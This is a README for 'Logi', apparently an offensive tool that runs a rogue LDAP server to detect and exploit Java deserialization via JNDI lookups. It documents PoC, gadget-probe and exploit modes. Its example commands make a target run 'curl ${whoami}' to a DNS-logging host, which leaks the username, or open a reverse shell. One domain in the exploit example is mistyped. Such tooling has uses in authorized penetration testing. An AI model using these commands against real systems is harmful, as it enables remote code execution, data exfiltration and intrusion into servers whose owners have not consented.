# LOGI
Logi is a ldap server focusing on ldap deserialize recon and exploit.


- [LOGI](#logi)
  - [✨Get started](#get-started)
  - [⚙️How it work](#️how-it-work)
  - [🚀Examples](#examples)
  - [💻See also](#see-also)

## ✨Get started
Download logi from release.
Use `-h` to show help.
![image](image/logi.png)

## ⚙️How it work
Logi hosts a ldap service, waiting for ldap lookup
- poc mode: reply a urldns gadget points to `domain` for deserialize verify
- probe mode: reply different probe gadgets points to `probename.domain` in turn for dependency probe
- exploit mode: reply a gadget for command execute

## 🚀Examples
Run poc mode with dns domain `dnslog.me`.
You need to send a ldap lookup to logi.
```
./logi -m 1 -d dnslog.me
```
Run probe mode with dns domain `dnslog.me` with embed wordlist `yso`.
You need to request many times to traverse the wordlist.
```
./logi -m 2 -d dnslog.me -w yso
```
Run probe mode with dns domain `dnslog.me` with custom wordlist in `./dict.txt`.
One class name per line.
```
./logi -m 2 -d dnslog.me -wp ./dict.txt
```
Run exploit mode with gadget `cb1v18`  with command `curl ${whoami}.dnslog.me`
```
./logi -m 3 -g cb1v18 -c 'curl ${whoami}.dnslog.i'
```
Run exploit mode with gadget `cb1v18` with reverse shell to `127.0.0.1:7777`
```
./logi -m 3 -g cb1v18 -s '127.0.0.1:7777'
```
## 💻See also
[GadgetProbe](https://github.com/BishopFox/GadgetProbe)

[JNDI-Inject-Exploit](https://github.com/exp1orer/JNDI-Inject-Exploit)